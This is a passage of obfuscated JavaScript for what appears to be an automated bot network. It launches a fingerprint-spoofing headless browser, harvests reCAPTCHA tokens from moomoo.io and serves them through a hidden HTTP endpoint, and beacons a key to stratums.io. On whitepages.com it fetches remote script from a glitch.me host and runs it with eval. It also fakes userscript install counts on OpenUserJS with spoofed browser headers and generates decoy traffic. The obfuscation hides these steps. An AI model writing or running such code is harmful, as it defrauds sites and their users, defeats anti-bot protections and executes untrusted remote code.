      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + a0(0xa, 'k5tp') + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    a0(0x0, '^Gk8') + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + a1(0xc) + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + a1(0x8) + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + Z(0x9) + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1175 + 0xab8 + 0x6bd
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x5 * 0x551 + -0x2380 + 0x8eb)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x1f53 + 0x2ce + -0x3 * 0xb3f), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x226a + 0xc * -0x301 + 0x2 * 0x236d), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x463 + 0x19 * 0x110 + -0x162d;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x32d + -0x4f * -0x34 + -0x1339; w < getRandomInt(0x2 * -0x5f9 + 0xbe7 + 0xc, -0x230 + -0x14f * 0xd + 0x29 * 0x78); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x1676 * -0x3 + -0x2c5 * 0x4f + 0x2088d);
        }
      }();
    }, -0x1924 + 0x246b + -0xae3), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a2 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x28e + -0x2459 * 0x1 + 0x21cb;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x1 * -0x2245 + -0xe35 + 0x55 * 0x92, -0x395 * 0x9 + 0x1429 + 0xc46)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v[a2(0x13)](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x7a57 + -0x3e79 + 0x3952);
    }, 0xe + 0x1203 + -0x11ad), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = 0x93 * 0x10 + 0x1e10 + 0x8 * -0x4e8;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0xd70 + -0x2309 + -0x1 * -0x2151), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x4ca * 0x7 + -0x680 + 0x2806), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x3467f + 0xdf447 + 0x628 * 0x7f);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x1a65 * 0x1 + -0x2081 + 0x3b4a);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x928 + 0x45a + 0x596);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x2f * -0x128 + 0x1 * 0x1afd + 0x3aeb);
}
doFlags['doOUJS'] && ((async () => {
  const a4 = d,
    a3 = b;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x83d + -0x2513 * 0x1 + 0x1cd7) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x254e + -0x3 * -0xbf + -0x278a));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x5 * 0x6f1 + 0x317 * 0x3 + -0x2bfa, D['indexOf']('\x20'));
        return B ? E['slice'](-0x5e * 0x53 + 0x1 * -0x7ed + 0x2667, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x460d + -0xdbf + 0x7adc),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x4a9d + 0xd * -0x511 + 0xb38a),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + a3(0x14, 'nNEw'),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      a4(0x15) + '0\x20(Macinto' + a3(0x6, 'eP!0') + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x2c * 0x1a + 0x9f7 + -0xe6f; k < -0x1501 + -0x114 * 0x2 + 0x172d; k++)
    setTimeout(f, (-0x6574 + 0xd741 + 0x7893) * k * getRandomInt(0xa8 * -0x12 + 0x80 * 0x1f + -0x3af, 0x2207 + 0x1051 + -0x3255));
  setInterval(() => {
    f();
    for (let l = -0x173d + 0x24f1 + 0x2 * -0x6da; l < 0x27 * -0x1 + -0x208d * -0x1 + 0x1031 * -0x2; l++)
      setTimeout(f, (0x5e38 * 0x2 + -0x7d61 + 0xab51) * l * getRandomInt(0x185e * 0x1 + -0x322 * -0x8 + -0x316d, 0x1 * -0x2056 + 0x89 * -0x1b + 0x14 * 0x257));
  }, 0x3cf73 * 0x6 + 0x51b097 + -0x319ec9);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
